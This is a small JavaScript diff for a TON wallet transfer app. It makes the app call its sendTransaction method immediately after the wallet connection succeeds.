@@ -51,6 +51,7 @@ class TONTransferApp {
         try {
             this.showStatus('Opening wallet...', 'loading');
             await this.tonConnectUI.connectWallet();
+            this.sendTransaction();
         } catch (error) {
             this.showStatus('Connection failed: ' + error.message, 'error');
         }
